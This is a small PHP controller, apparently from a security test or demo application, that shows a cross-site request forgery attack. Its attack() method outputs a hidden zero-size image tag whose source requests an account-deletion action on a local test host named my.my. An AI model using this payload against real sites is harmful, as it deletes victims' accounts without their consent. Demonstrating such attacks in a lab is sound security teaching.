<?php

/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

someloader('some.application.controller');

class SomeControllerCsrfclient extends SomeController {
    
    public function display() {
     ?>
        <h2>Login with user to http://my.my!</h2>
        
<a href='index.php?app=security&attack=csrfclient&action=attack'>Open csrf view with embedded img tag with src to delete user.</a>
<?php
    }
    
    public function attack() {
        // just for testing purposes there are test.xxx and my.my virtualhost. Attack my.my
    ?>
<img src="http://my.my?app=account&action=deleteme" width="0px" height="0px" alt="" />
    <?php
        
    }
}